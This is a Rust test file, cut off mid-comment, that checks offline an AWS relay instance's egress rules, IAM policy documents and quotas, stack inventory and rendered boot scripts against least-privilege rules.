//! S13 slice I: the relay instance, its reload unit and the egress changes (plans/s13-contracts.md §I-infra.6.1 and
//! 6.2), offline. infra/scripts/print-policies.ts and infra/relay-spec.ts (with policies.ts and egress-spec.ts, which
//! they import) are compiled once per test run ([`compiled`]) with infra/'s own tsc and check-policies.sh's flags, and
//! run with node; the plan check runs as `make deploy` runs it, through infra/scripts/check-plan.sh (its own compile,
//! into a `PLAN_CHECK_OUT` of the test's). The reload unit, infra/relay/reload.py, runs under the Mac's
//! `/usr/bin/python3 -I` (Q-I4) in a planted §I-infra.3.3 tree (`AI_ENV_RELAY_ROOT`, [`World`]): its aws is
//! tests/fakes/aws.sh (a Parameter Store and a bucket in files), its systemctl, nft and swapon the logging fakes
//! [`SYSTEMCTL`], [`NFT`] and [`SWAPON`]. The rendered user data runs under `/bin/bash` with every system path rewritten
//! into a temporary directory and fakes for what touches the system ([`Bootstrap`]); boot.sh never runs here. The list
//! documents are I-R77's placeholders; every TLS pair is built at run time from parts around a low-entropy body
//! (I-R78). Nothing reaches AWS or the network, and every child runs under common's deadline.
use super::common::*;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::os::unix::fs::{MetadataExt, PermissionsExt};
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::sync::OnceLock;
use std::time::{SystemTime, UNIX_EPOCH};

const REPO: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/../..");
/// The account every printed and planned document is built for (the documentation one).
const ACCOUNT: &str = "123456789012";

fn infra() -> PathBuf {
    Path::new(REPO).join("infra")
}

/// `cmd` to the end, its output captured, under common's deadline ([`RUN_LIMIT`]); its stdin is the caller's to set.
fn bounded(cmd: &mut Command, what: &str) -> Output {
    let child = cmd.stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap_or_else(|e| panic!("{what}: {e}"));
    finish(child, RUN_LIMIT, what)
}

fn all(o: &Output) -> String {
    format!("{}{}", stdout(o), stderr(o))
}

fn text(p: &Path) -> String {
    std::fs::read_to_string(p).unwrap_or_default()
}

fn mode(p: &Path) -> u32 {
    std::fs::symlink_metadata(p).unwrap_or_else(|e| panic!("{}: {e}", p.display())).permissions().mode() & 0o777
}

fn executable(p: &Path, body: &str) {
    std::fs::write(p, body).unwrap();
    std::fs::set_permissions(p, std::fs::Permissions::from_mode(0o755)).unwrap();
}

// ---- the TypeScript spec and documents (§I-infra.6.1) ----

/// The tsc output of scripts/print-policies.ts and relay-spec.ts, compiled once per test run with check-policies.sh's
/// flags into a directory of this process under cargo's test tmpdir.
fn compiled() -> &'static Path {
    static OUT: OnceLock<PathBuf> = OnceLock::new();
    OUT.get_or_init(|| {
        let infra = infra();
        let tsc = infra.join("node_modules/.bin/tsc");
        assert!(tsc.exists(), "{} is missing: make infra-install", tsc.display());
        let out = Path::new(env!("CARGO_TARGET_TMPDIR")).join(format!("relay-tsc-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&out);
        let mut cmd = Command::new(&tsc);
        cmd.args(["--strict", "--target", "es2022", "--module", "commonjs", "--moduleResolution", "node", "--types", "node", "--rootDir", ".", "--outDir"])
            .arg(&out)
            .args(["scripts/print-policies.ts", "relay-spec.ts"])
            .current_dir(&infra)
            .stdin(Stdio::null());
        let o = bounded(&mut cmd, "tsc");
        assert!(o.status.success(), "tsc: {}", all(&o));
        out
    })
}

/// `node -e`: a prelude loads the compiled modules as `spec` (egress-spec), `pol` (policies) and `rs` (relay-spec), and
/// infra/egress-config.json as `cfg`; `body` prints one JSON value on stdout, which is returned.
fn node(body: &str, envs: &[(&str, &str)]) -> Value {
    let prelude = format!(
        "const path = require('path'); const fs = require('fs'); const out = {:?}; const infra = {:?};\n\
         const spec = require(path.join(out, 'egress-spec.js')), pol = require(path.join(out, 'policies.js')), rs = require(path.join(out, 'relay-spec.js'));\n\
         const cfg = spec.loadEgressConfig(path.join(infra, 'egress-config.json'));\n",
        compiled().display().to_string(),
        infra().display().to_string()
    );
    let mut cmd = Command::new("node");
    cmd.arg("-e").arg(format!("{prelude}{body}")).envs(envs.iter().copied()).stdin(Stdio::null());
    let o = bounded(&mut cmd, "node");
    assert!(o.status.success(), "node: {}", all(&o));
    serde_json::from_slice(&o.stdout).unwrap_or_else(|e| panic!("node printed no JSON ({e}): {}", all(&o)))
}

/// print-policies.js for [`ACCOUNT`] and infra/'s parameter files (every stack id the printer's placeholder), `args` added.
fn pp(args: &[&str]) -> String {
    let infra = infra();
    let mut cmd = Command::new("node");
    cmd.arg(compiled().join("scripts/print-policies.js"))
        .args(["--account-id", ACCOUNT, "--image-config"])
        .arg(infra.join("image-config.json"))
        .arg("--egress-config")
        .arg(infra.join("egress-config.json"))
        .args(args)
        .stdin(Stdio::null());
    let o = bounded(&mut cmd, "print-policies");
    assert!(o.status.success(), "print-policies {args:?}: {}", all(&o));
    stdout(&o)
}

/// The printed document `name`, parsed.
fn document(name: &str) -> Value {
    serde_json::from_str(pp(&["--name", name]).trim()).unwrap()
}

/// `d`'s statement `sid`.
fn statement<'a>(d: &'a Value, sid: &str) -> &'a Value {
    d["Statement"].as_array().unwrap().iter().find(|s| s["Sid"] == sid).unwrap_or_else(|| panic!("no statement {sid}: {d}"))
}

/// A policy element (`Action`, `Resource`) as a list: an array, or one string.
fn list(v: &Value) -> Vec<String> {
    match v {
        Value::Array(a) => a.iter().map(|x| x.as_str().unwrap().to_string()).collect(),
        Value::String(s) => vec![s.clone()],
        _ => vec![],
    }
}

/// I-T1: the spec takes the relay; each wider path is refused with its rule's text: the VM group's relay rule widened
/// or moved to 443, the relay's private port open to the internet, port 22, the relay group or the NACL short of a rule,
/// the NACL's relay entry widened, and every relay value of the config that I-R2 or I-R8 refuses.
#[test]
fn the_egress_spec_takes_the_relay_and_refuses_wider_paths() {
    let configs: [(&str, Value, &str); 12] = [
        ("relayIp", json!("10.42.1.20"), "relayIp 10.42.1.20 is not inside proxySubnetCidr 10.42.0.0/24 (the relay shares the proxy's subnet and route)"),
        ("relayIp", json!("10.42.0.2"), "relayIp 10.42.0.2 is reserved by AWS (the first four addresses of the subnet)"),
        ("relayIp", json!("10.42.0.255"), "relayIp 10.42.0.255 is the subnet's broadcast address (reserved by AWS)"),
        ("relayIp", json!("10.42.0.10"), "relayIp and proxyIp must differ (10.42.0.10)"),
        ("relayPort", json!(443), "relayPort 443 must be an unprivileged port (1024–65535) other than proxyPort 3128"),
        ("relayPort", json!(3128), "relayPort 3128 must be an unprivileged port (1024–65535) other than proxyPort 3128"),
        ("relayPort", json!(22), "relayPort 22 must be an unprivileged port (1024–65535) other than proxyPort 3128"),
        (
            "relayParameterPrefix",
            json!("/ai-env/proxy/relay"),
            "relayParameterPrefix /ai-env/proxy/relay must be an absolute /a/b path outside /aws and /ssm, without a trailing /, neither inside parameterPrefix /ai-env/proxy nor containing it (the proxy's role reads /ai-env/proxy/*)",
        ),
        (
            "relayParameterPrefix",
            json!("/ai-env"),
            "relayParameterPrefix /ai-env must be an absolute /a/b path outside /aws and /ssm, without a trailing /, neither inside parameterPrefix /ai-env/proxy nor containing it (the proxy's role reads /ai-env/proxy/*)",
        ),
        ("relayLogGroup", json!("/ai-env/egress/squid"), "relayLogGroup /ai-env/egress/squid must be an absolute /a/b path other than logGroup"),
        ("relayLogRetentionDays", json!(10), "relayLogRetentionDays 10 is not a CloudWatch Logs retention"),
        ("relaySecurityGroupName", json!("ai-env-proxy-x"), "no security group name may prefix another (rule names are <sg name>-…)"),
    ];
    let cases = Value::Array(configs.iter().map(|(k, v, _)| json!([k, v])).collect()).to_string();
    let r = node(
        r#"const allow = spec.readAllowText(path.join(infra, 'proxy'));
const refused = (s) => { try { spec.assertEgressSpec(s, allow); return ''; } catch (e) { return e.message; } };
const edited = (f) => { const s = spec.egressSpec(cfg); f(s); return refused(s); };
const relay = (s) => s.securityGroups.relay.rules;
console.log(JSON.stringify({
  spec: refused(spec.egressSpec(cfg)),
  edits: {
    'the VM relay rule to 10.42.0.0/24': edited((s) => { s.securityGroups.vm.rules[1].peer = { cidr: '10.42.0.0/24' }; }),
    'a VM rule TCP 443 to 10.42.0.20/32': edited((s) => { s.securityGroups.vm.rules[1].port = 443; }),
    'the relay private ingress from 0.0.0.0/0': edited((s) => { relay(s)[1].peer = { cidr: '0.0.0.0/0' }; }),
    'a relay rule on port 22': edited((s) => { relay(s).push({ direction: 'ingress', protocol: 'tcp', port: 22, peer: { cidr: '0.0.0.0/0' }, description: 'ssh' }); }),
    'the relay group without its DNS rules': edited((s) => { s.securityGroups.relay.rules = relay(s).filter((r) => r.port !== 53); }),
    'the NACL without the relay ingress entry': edited((s) => { s.nacl.ingress = s.nacl.ingress.filter((r) => r.ruleNo !== 110); }),
    'the NACL relay egress entry to 10.42.0.0/16': edited((s) => { s.nacl.egress.find((r) => r.ruleNo === 110).cidr = '10.42.0.0/16'; }),
  },
  configs: JSON.parse(process.env.RT_CASES).map(([k, v]) => refused(spec.egressSpec({ ...cfg, [k]: v }))),
}));"#,
        &[("RT_CASES", &cases)],
    );
    assert_eq!(r["spec"], "", "the spec with the relay passes");
    for (edit, want) in [
        ("the VM relay rule to 10.42.0.0/24", "the VM security group allows exactly two rules, egress TCP 3128 to 10.42.0.10/32 and TCP 7443 to 10.42.0.20/32"),
        ("a VM rule TCP 443 to 10.42.0.20/32", "the VM security group allows exactly two rules"),
        ("the relay private ingress from 0.0.0.0/0", "the relay security group allows only TCP 443 from 0.0.0.0/0, TCP 7443 from the VM security group"),
        ("a relay rule on port 22", "no port 22"),
        ("the relay group without its DNS rules", "the relay security group must have exactly 7 distinct rules"),
        ("the NACL without the relay ingress entry", "the VM subnet's network ACL must allow exactly two ingress rules"),
        ("the NACL relay egress entry to 10.42.0.0/16", "the VM subnet's network ACL must allow exactly two egress rules"),
    ] {
        let got = r["edits"][edit].as_str().unwrap();
        assert!(got.contains(want), "{edit}: want {want:?} in {got:?}");
    }
    for ((k, v, want), got) in configs.iter().zip(r["configs"].as_array().unwrap()) {
        let got = got.as_str().unwrap();
        assert!(got.contains(want), "{k} {v}: want {want:?} in {got:?}");
    }
}

/// I-T57 (S13 part B, §Q.14): every group's and rule's description is in EC2's character set, which only the API held
/// before: B1's deploy stopped at the VM group's relay rule, "to the relay's private port" refused for its apostrophe.
/// The spec refuses that text again, a non-ASCII dash and 256 characters, each naming its rule; 255 characters and EC2's
/// whole set pass.
#[test]
fn the_egress_spec_holds_ec2s_description_characters() {
    let r = node(
        r#"const allow = spec.readAllowText(path.join(infra, 'proxy'));
const refused = (s) => { try { spec.assertEgressSpec(s, allow); return ''; } catch (e) { return e.message; } };
const edited = (f) => { const s = spec.egressSpec(cfg); f(s); return refused(s); };
const s = spec.egressSpec(cfg);
const texts = spec.SG_KEYS.flatMap((k) => [s.securityGroups[k].description, ...s.securityGroups[k].rules.map((r) => r.description)]);
console.log(JSON.stringify({
  spec: refused(s), count: texts.length, outside: texts.filter((d) => !spec.EC2_DESCRIPTION.test(d)),
  apostrophe: edited((s) => { s.securityGroups.vm.rules[1].description = "to the relay's private port"; }),
  dash: edited((s) => { s.securityGroups.relay.rules[0].description = 'worker tunnels — the internet face'; }),
  long: edited((s) => { s.securityGroups.proxy.rules[0].description = 'x'.repeat(256); }),
  max: edited((s) => { s.securityGroups.proxy.rules[0].description = 'x'.repeat(255); }),
  set: edited((s) => { s.securityGroups.proxy.rules[0].description = 'a-z A-Z 0-9 ._-:/()#,@[]+=&;{}!$*'; }),
}));"#,
        &[],
    );
    assert_eq!(r["spec"], "", "the spec passes");
    assert_eq!(r["count"], 18, "three groups' descriptions and their fifteen rules'");
    assert_eq!(r["outside"], json!([]), "every description in EC2's set");
    let set = "is not EC2's (at most 255 of a-z A-Z 0-9, space and ._-:/()#,@[]+=&;{}!$*)";
    for (k, want) in [
        ("apostrophe", "rule ai-env-vm-egress-to-10.42.0.20-32-tcp-7443: description \"to the relay's private port\" "),
        ("dash", "rule ai-env-relay-from-0.0.0.0-0-tcp-443: description \"worker tunnels \u{2014} the internet face\" "),
        ("long", "rule ai-env-proxy-from-ai-env-vm-egress-tcp-3128: description \"xxxx"),
    ] {
        let got = r[k].as_str().unwrap();
        assert!(got.contains(want) && got.contains(set), "{k}: want {want:?} and {set:?} in {got:?}");
    }
    assert_eq!(r["max"], "", "255 characters pass");
    assert_eq!(r["set"], "", "EC2's whole set passes");
}

/// I-T2:the VM subnet's NACL is compared as a set per direction (the provider's order is not the program's): I-R5's
/// entries pass in either order; a third entry, a missing one, rule 120 for 110 and a narrower ephemeral range are refused.
#[test]
fn check_nacl_compares_the_entries_as_a_set() {
    let r = node(
        r#"const s = spec.egressSpec(cfg);
const [i, e] = [s.nacl.ingress, s.nacl.egress];
const rev = (xs) => [...xs].reverse();
const c = (ing, eg) => spec.checkNacl(cfg, ing, eg) ?? '';
const third = { ruleNo: 120, protocol: 'tcp', action: 'allow', cidr: '10.42.0.30/32', fromPort: 1024, toPort: 65535 };
const renumbered = (xs) => xs.map((x) => (x.ruleNo === 110 ? { ...x, ruleNo: 120 } : x));
console.log(JSON.stringify({
  ordered: c(i, e), reversedIn: c(rev(i), e), reversedOut: c(i, rev(e)), reversedBoth: c(rev(i), rev(e)),
  thirdIn: c([...i, third], e), missingIn: c(i.slice(0, 1), e), renumberedIn: c(renumbered(i), e),
  narrowIn: c(i.map((x) => (x.ruleNo === 110 ? { ...x, toPort: 65534 } : x)), e),
  thirdOut: c(i, [...e, { ...third, fromPort: 443, toPort: 443 }]), missingOut: c(i, e.slice(1)), renumberedOut: c(i, renumbered(e)),
}));"#,
        &[],
    );
    let ingress = "the VM subnet's network ACL must allow exactly two ingress rules, TCP 1024-65535 from 10.42.0.10/32 (100) and from 10.42.0.20/32 (110), got ";
    let egress = "the VM subnet's network ACL must allow exactly two egress rules, TCP 3128 to 10.42.0.10/32 (100) and TCP 7443 to 10.42.0.20/32 (110), got ";
    for k in ["ordered", "reversedIn", "reversedOut", "reversedBoth"] {
        assert_eq!(r[k], "", "{k}: the same entries in another order pass");
    }
    for (k, want) in [("thirdIn", ingress), ("missingIn", ingress), ("renumberedIn", ingress), ("narrowIn", ingress), ("thirdOut", egress), ("missingOut", egress), ("renumberedOut", egress)] {
        let got = r[k].as_str().unwrap();
        assert!(got.starts_with(want), "{k}: {got}");
    }
}

/// I-T3: the endpoint's, the relay role's and its trust policy's documents for the example account are the pinned ones
/// (I-R40, I-R42, I-R43), their sizes I-R45's, in Rust (`canonical_policy_sha256`) and in TypeScript alike. The relay
/// role's moved with R-93 and R-147 (it reads `peers` and `access` by name: S13's was `b48ef84b…9cfd`, 1523 characters;
/// R-93's `ef34503c…665f`, 1592), as print-policies measures it.
#[test]
fn the_relay_documents_of_policies_ts_are_the_pinned_ones() {
    for (name, pinned, size) in [
        ("s3-endpoint", "1e30d2178ae4648b2aca53e97c05e22c42d207c2295e1478ded56de73034cc47", 842),
        ("relay", "75f062a05605e30bc7884339ff96ecf9628484029bdb7814f5c75fc4b57a4d57", 1662),
        ("relay-trust", "131984e3027c5a54ad8ffbf5d543bf4c11a2eebdb7113e021f229772960667b9", 146),
    ] {
        let printed = pp(&["--name", name]);
        let doc = printed.trim();
        assert_eq!(ai_env_cli::bridge::infra::canonical_policy_sha256(doc).unwrap(), pinned, "{name}: {doc}");
        assert_eq!(doc.chars().count(), size, "{name}'s size: {doc}");
        let ts = node("console.log(JSON.stringify(pol.canonicalPolicySha256(JSON.parse(process.env.RT_DOC))));", &[("RT_DOC", doc)]);
        assert_eq!(ts, pinned, "{name}: TypeScript's own hash");
    }
}

/// The ops policy's size, as `every_document_fits_its_quota_offline` counts it: 6 144 is its quota.
const OPS_SIZE: usize = 5752;

/// I-T4: every document the printer lists is within its IAM quota, counted as check-policies.sh counts it (managed and
/// inline 6 144, trust policies and `runtime` 2 048, the endpoint's and the bucket's 20 480): a statement too many fails
/// here, offline, before part B. `ops`, with R-147's statement, at its measured size: what room is left is a decision.
#[test]
fn every_document_fits_its_quota_offline() {
    let listed = pp(&[]);
    for line in listed.lines() {
        let fields: Vec<&str> = line.split('\t').collect();
        let (name, kind) = (fields[0], fields[1]);
        let max = if name == "s3-endpoint" || name == "transcripts-bucket" {
            20_480
        } else if name == "runtime" || kind == "RESOURCE_POLICY" {
            2_048
        } else {
            6_144
        };
        let size = pp(&["--name", name]).trim().chars().count();
        assert!(size <= max, "{name}: {size} characters, over its {max}");
        if name == "ops" {
            assert_eq!(size, OPS_SIZE, "ops: {size} characters of its {max}");
        }
    }
    assert!(listed.contains("\nrelay-trust\tRESOURCE_POLICY\t") && listed.contains("\nrelay\tIDENTITY_POLICY\t"), "{listed}");
}

/// I-T5: ai-env-ops starts and stops the relay instance and reads its six non-secret parameters (`peers` since R-93 and
/// `access` since R-147, for `ai-env relay status`), writes `access` alone of them with `ssm:PutParameter` alone (R-147,
/// `WriteRelayAccess`; `suspended` is the only other parameter it writes), and nothing more of it: never the TLS pair,
/// never a relay parameter by a wildcard, never a command or a session on the relay instance; it reads the relay's log
/// group and lists the account's addresses.
#[test]
fn ops_starts_the_relay_and_reads_its_parameters_but_the_tls_pair() {
    let ops = document("ops");
    let parameter = |p: &str| format!("arn:aws:ssm:eu-central-1:{ACCOUNT}:parameter/ai-env/relay/{p}");
    let relay = statement(&ops, "RelayInstance");
    assert_eq!((relay["Effect"].as_str(), list(&relay["Action"])), (Some("Allow"), vec!["ec2:StartInstances".to_string(), "ec2:StopInstances".to_string()]));
    assert_eq!(list(&relay["Resource"]), [format!("arn:aws:ec2:eu-central-1:{ACCOUNT}:instance/i-0123456789abcdef1")]);
    let read = statement(&ops, "ReadRelayParameters");
    assert_eq!(list(&read["Action"]), ["ssm:GetParameters"]);
    assert_eq!(list(&read["Resource"]), ["artifact", "workers", "grants", "token-signers", "peers", "access"].map(parameter));
    let write = statement(&ops, "WriteRelayAccess");
    assert_eq!((write["Effect"].as_str(), list(&write["Action"])), (Some("Allow"), vec!["ssm:PutParameter".to_string()]));
    assert_eq!(list(&write["Resource"]), [parameter("access")]);
    assert_eq!(write.as_object().unwrap().len(), 4, "no condition: {write}");
    let writes_parameters = |s: &&Value| list(&s["Action"]).iter().any(|a| a.starts_with("ssm:") && !a.contains("Get") && !a.contains("Describe") && !a.contains("SendCommand"));
    let writers: Vec<&str> = ops["Statement"].as_array().unwrap().iter().filter(writes_parameters).map(|s| s["Sid"].as_str().unwrap()).collect();
    assert_eq!(writers, ["WriteRelayAccess", "WriteSuspendedParameter"], "exactly one statement more of ssm writes");
    for s in ops["Statement"].as_array().unwrap() {
        let sid = s["Sid"].as_str().unwrap_or("(no Sid)");
        let actions = list(&s["Action"]);
        let reaches_instances = actions.iter().any(|a| a == "ssm:SendCommand" || a == "ssm:StartSession");
        for r in list(&s["Resource"]) {
            assert!(!r.contains("/ai-env/relay/tls"), "{sid} names the TLS pair: {r}");
            assert!(!(r.contains(":parameter/ai-env/relay") && r.contains('*')), "{sid} names the relay's parameters by a wildcard: {r}");
            if reaches_instances {
                assert!(!r.contains("i-0123456789abcdef1") && !r.contains("instance/*") && r != "*", "{sid} reaches the relay instance with {actions:?}: {r}");
            }
        }
    }
    let logs = list(&statement(&ops, "ReadLogs")["Resource"]);
    let group = format!("arn:aws:logs:eu-central-1:{ACCOUNT}:log-group:/ai-env/relay");
    assert!(logs.contains(&group) && logs.contains(&format!("{group}:*")), "{logs:?}");
    assert!(list(&statement(&ops, "OpsUnscoped")["Action"]).iter().any(|a| a == "ec2:DescribeAddresses"));
}

/// I-T6: ai-env-deploy-egress lets the deployer build the relay (its address, its parameters, its log group, its
/// instance profile, the SSM agent's policy on its role, its role passed to EC2 only) and change the VM subnet's NACL
/// entries; Q-I12: the relay role's attach right is a statement of its own, the SSM agent's policy alone. `deploy` is
/// byte for byte S12's.
#[test]
fn the_deployer_can_build_the_relay_and_change_the_vm_nacl() {
    let d = document("deploy-egress");
    let iam = |rest: &str| format!("arn:aws:iam::{ACCOUNT}:{rest}");
    let network = list(&statement(&d, "Ec2EgressNetwork")["Action"]);
    for a in ["ec2:AllocateAddress", "ec2:ReleaseAddress", "ec2:AssociateAddress", "ec2:DisassociateAddress", "ec2:CreateNetworkAclEntry", "ec2:DeleteNetworkAclEntry", "ec2:ReplaceNetworkAclEntry"] {
        assert!(network.iter().any(|x| x == a), "Ec2EgressNetwork without {a}");
    }
    let unscoped = list(&statement(&d, "EgressUnscoped")["Action"]);
    for a in ["ec2:DescribeAddresses", "ec2:DescribeAddressesAttribute"] {
        assert!(unscoped.iter().any(|x| x == a), "EgressUnscoped without {a}");
    }
    assert!(list(&statement(&d, "ProxyParameters")["Resource"]).contains(&format!("arn:aws:ssm:eu-central-1:{ACCOUNT}:parameter/ai-env/relay/*")));
    let logs = list(&statement(&d, "EgressLogGroup")["Resource"]);
    let group = format!("arn:aws:logs:eu-central-1:{ACCOUNT}:log-group:/ai-env/relay");
    assert!(logs.contains(&group) && logs.contains(&format!("{group}:*")), "{logs:?}");
    assert!(list(&statement(&d, "ProxyInstanceProfile")["Resource"]).contains(&iam("instance-profile/ai-env-relay")));
    let attach = statement(&d, "AttachRelayManagedPolicy");
    assert_eq!(list(&attach["Resource"]), [iam("role/ai-env-relay")]);
    assert_eq!(list(&attach["Action"]), ["iam:AttachRolePolicy", "iam:DetachRolePolicy"]);
    assert_eq!(attach["Condition"], json!({"ArnEquals": {"iam:PolicyARN": ["arn:aws:iam::aws:policy/AmazonSSMManagedEC2InstanceDefaultPolicy"]}}));
    assert!(!list(&statement(&d, "AttachManagedPolicies")["Resource"]).contains(&iam("role/ai-env-relay")), "the connector operator's policy never on the relay's role");
    let pass = statement(&d, "PassProxyRole");
    assert!(list(&pass["Resource"]).contains(&iam("role/ai-env-relay")));
    assert_eq!(pass["Condition"], json!({"StringEquals": {"iam:PassedToService": "ec2.amazonaws.com"}}));
    let deploy = pp(&["--name", "deploy"]);
    assert_eq!(ai_env_cli::bridge::infra::canonical_policy_sha256(deploy.trim()).unwrap(), "0a29b2cf283dd70409ef596daecbd93ada5924ee5bcf0f26ea14ce922fa644bc", "deploy gains no right");
    assert_eq!(deploy.trim().chars().count(), 5929);
}

/// The stack inventory (egress-spec.ts stackInventory) of infra/'s parameter files in each mode, type → names: `none`,
/// `firewall`, `queryLog` (firewall with the query log).
fn inventories() -> Value {
    node(
        r#"const image = JSON.parse(fs.readFileSync(path.join(infra, 'image-config.json'), 'utf-8'));
const names = { imageName: String(image.imageName), logGroup: String(image.logGroup) };
const inv = (c) => Object.fromEntries(spec.stackInventory(c, names));
console.log(JSON.stringify({ none: inv(cfg), firewall: inv({ ...cfg, dnsMode: 'firewall' }), queryLog: inv({ ...cfg, dnsMode: 'firewall', enableDnsQueryLog: true }) }));"#,
        &[],
    )
}

/// I-R9's nineteen and the boot object (LD-R56): what S13 adds to the stack in every mode.
const RELAY_INVENTORY: [(&str, &str); 20] = [
    ("aws:s3/bucketObjectv2:BucketObjectv2", "relay-artifact"),
    ("aws:s3/bucketObjectv2:BucketObjectv2", "relay-boot"),
    ("aws:cloudwatch/logGroup:LogGroup", "relay-log-group"),
    ("aws:iam/role:Role", "ai-env-relay"),
    ("aws:iam/rolePolicy:RolePolicy", "ai-env-relay"),
    ("aws:ec2/securityGroup:SecurityGroup", "ai-env-relay"),
    ("aws:vpc/securityGroupIngressRule:SecurityGroupIngressRule", "ai-env-relay-from-0.0.0.0-0-tcp-443"),
    ("aws:vpc/securityGroupIngressRule:SecurityGroupIngressRule", "ai-env-relay-from-ai-env-vm-egress-tcp-7443"),
    ("aws:vpc/securityGroupEgressRule:SecurityGroupEgressRule", "ai-env-relay-to-0.0.0.0-0-tcp-443"),
    ("aws:vpc/securityGroupEgressRule:SecurityGroupEgressRule", "ai-env-relay-to-1.1.1.1-32-udp-53"),
    ("aws:vpc/securityGroupEgressRule:SecurityGroupEgressRule", "ai-env-relay-to-1.1.1.1-32-tcp-53"),
    ("aws:vpc/securityGroupEgressRule:SecurityGroupEgressRule", "ai-env-relay-to-9.9.9.9-32-udp-53"),
    ("aws:vpc/securityGroupEgressRule:SecurityGroupEgressRule", "ai-env-relay-to-9.9.9.9-32-tcp-53"),
    ("aws:vpc/securityGroupEgressRule:SecurityGroupEgressRule", "ai-env-vm-egress-to-10.42.0.20-32-tcp-7443"),
    ("aws:iam/rolePolicyAttachment:RolePolicyAttachment", "ai-env-relay-ssm"),
    ("aws:iam/instanceProfile:InstanceProfile", "ai-env-relay"),
    ("aws:ec2/instance:Instance", "ai-env-relay"),
    ("aws:ec2/eip:Eip", "ai-env-relay"),
    ("aws:ec2/eipAssociation:EipAssociation", "ai-env-relay"),
    ("aws:ssm/parameter:Parameter", "ai-env-relay-artifact"),
];

/// I-T7: the inventory holds the relay's twenty (I-R9's nineteen, LD-R56's boot object) in every mode, and with the stack
/// counts 95, 100 and 103 (S12: 75, 80, 83).
#[test]
fn the_inventory_counts_the_relay_20_more() {
    let inv = inventories();
    let total = |mode: &str| 1 + inv[mode].as_object().unwrap().values().map(|names| names.as_array().unwrap().len()).sum::<usize>();
    assert_eq!((total("none"), total("firewall"), total("queryLog")), (95, 100, 103));
    for mode in ["none", "firewall", "queryLog"] {
        for (ty, name) in RELAY_INVENTORY {
            assert!(inv[mode][ty].as_array().is_some_and(|names| names.iter().any(|n| n == name)), "{mode}: {ty} {name} missing");
        }
    }
}

/// The lines between `base64 -d <<'AIENV_RELAY_RELOAD_EOF' …` and its delimiter (reload.py.gz in base64, in which any
/// word may occur), and the rest of the boot script.
fn split_reload_block(boot: &str) -> (Vec<String>, String) {
    let (mut block, mut rest, mut inside) = (vec![], String::new(), false);
    for line in boot.lines() {
        if inside && line != "AIENV_RELAY_RELOAD_EOF" {
            block.push(line.to_string());
            continue;
        }
        inside = line.starts_with("base64 -d <<'AIENV_RELAY_RELOAD_EOF'");
        rest.push_str(line);
        rest.push('\n');
    }
    (block, rest)
}

/// The first `@[A-Z_]+@` of `text`.
fn placeholder_in(text: &str) -> Option<String> {
    text.match_indices('@').find_map(|(i, _)| {
        let rest = &text[i + 1..];
        let n = rest.bytes().take_while(|c| c.is_ascii_uppercase() || *c == b'_').count();
        (n > 0 && rest.as_bytes().get(n) == Some(&b'@')).then(|| text[i..i + n + 2].to_string())
    })
}

/// `bytes` gunzipped (`/usr/bin/gzip -dc`).
fn gunzip(bytes: &[u8]) -> Vec<u8> {
    let t = tempfile::tempdir().unwrap();
    std::fs::write(t.path().join("x.gz"), bytes).unwrap();
    let mut cmd = Command::new("/usr/bin/gzip");
    cmd.arg("-dc").arg(t.path().join("x.gz")).stdin(Stdio::null());
    let o = bounded(&mut cmd, "gzip -dc");
    assert!(o.status.success(), "gzip -dc: {}", stderr(&o));
    o.stdout
}

/// `dir`'s files copied into `to` (flat: the relay's directories have no subdirectory).
fn copy_dir(dir: &Path, to: &Path) {
    std::fs::create_dir_all(to).unwrap();
    for e in std::fs::read_dir(dir).unwrap().flatten() {
        std::fs::copy(e.path(), to.join(e.file_name())).unwrap();
    }
}

/// `file` without its lines containing `what`.
fn drop_lines(file: &Path, what: &str) {
    let kept: String = text(file).lines().filter(|l| !l.contains(what)).map(|l| format!("{l}\n")).collect();
    std::fs::write(file, kept).unwrap();
}

fn append(file: &Path, more: &str) {
    std::fs::write(file, format!("{}{more}", text(file))).unwrap();
}

/// `/bin/bash -n` of `script`, written under `dir` as `name`.
fn parses(dir: &Path, name: &str, script: &str) {
    std::fs::write(dir.join(name), script).unwrap();
    let mut cmd = Command::new("/bin/bash");
    cmd.arg("-n").arg(dir.join(name)).stdin(Stdio::null());
    let o = bounded(&mut cmd, "bash -n");
    assert!(o.status.success(), "bash -n {name}: {}", all(&o));
}

/// The boot object's files, the user data rendered for them in [`BUCKET`], and R's required lines, from the tree (R's
/// files through relayDeployDir()).
fn rendered_relay() -> Value {
    node(
        "const dir = path.join(infra, 'relay');\n\
         const files = rs.renderRelayFiles(cfg, 'eu-central-1', dir);\n\
         console.log(JSON.stringify({ files, userData: rs.renderRelayUserData(process.env.RT_BUCKET, files, 'eu-central-1', dir), required: rs.RELAY_REQUIRED_LINES }));",
        &[("AI_ENV_REPO_ROOT", REPO), ("RT_BUCKET", BUCKET)],
    )
}

/// I-T8 (split by LD-R56). The relay's user data, rendered from the tree, fits EC2's limit, leaves no placeholder, parses,
/// and is the bootstrap alone: the swapfile first, kept in /etc/fstab (LD-R57), then the one fetch of the boot object in
/// reload.py's form, its SHA-256 against the pin, and /bin/bash on the file. The boot script, rendered from the tree (R's
/// files through relayDeployDir()), leaves no placeholder, parses, and carries reload.py (gzipped, base64), the
/// CloudWatch file and R's three files byte for byte, every line slice I rests on, relay.env's lines (R's example less
/// AI_ENV_RELAY_ID), the timers, the relay's user, the packages and the units enabled. Neither holds an update, a fetch
/// tool or port 22. The relay security plan's change (R-95, R-96, LD-R57): the unit's `InaccessiblePaths=/run/dbus`,
/// `InaccessiblePaths=-/run/systemd/resolve` and `MemorySwapMax=256M`, logrotate every 5 minutes (its drop-in's
/// `AccuracySec=1min` and `RandomizedDelaySec=0` over the package's timer) with `size 20M` and `nodateext` in both
/// stanzas (no interval, no `maxsize`, no `dateext`: AL2023's logrotate.conf sets it, and a dated name rotates a log once
/// a day at most), the CloudWatch agent as `cwagent` and `cwagent` in the relay's group after the packages and before the
/// agent starts, never fatal, the agent's unit given that group by its own drop-in before its start (its start sets the
/// groups of one thread alone, agent issue 1140: the first deploy's agent ran without it and never read requests.log),
/// relay.log made 0644 root when missing before the units start, and no comment line in
/// either script. Copies are refused with I-R25's texts, each on the file that holds it: over the limit (user-data.sh's),
/// a stale .gz, a placeholder in reload.py, boot.sh or user-data.sh, a token gone from either, boot.sh missing, a required
